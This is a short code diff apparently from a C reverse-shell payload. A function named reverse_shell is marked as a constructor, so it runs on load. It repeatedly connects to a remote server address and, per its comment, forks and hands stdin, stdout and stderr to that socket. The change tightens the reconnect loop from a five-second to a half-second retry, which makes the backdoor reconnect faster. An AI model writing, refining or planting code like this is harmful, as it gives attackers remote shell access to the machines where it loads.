@@ -9,7 +9,6 @@
 
 void __attribute__((constructor)) reverse_shell(){ 
   int socket_fd;
-  int connection = -1;
   int pid;
   struct sockaddr_in server;  
 
@@ -20,9 +19,8 @@ void __attribute__((constructor)) reverse_shell(){
   server.sin_addr.s_addr = inet_addr(addr);
 
   // loop until connection is established
-  while(connection < 0){
-    sleep(5);
-    connection = connect(socket_fd, (struct sockaddr *)&server, sizeof(struct sockaddr));
+  while( connect(socket_fd, (struct sockaddr *)&server, sizeof(struct sockaddr)) != 0){
+    usleep(500000);
   }
 
   // fork process && copy stdin, stdout & stderr to client socket
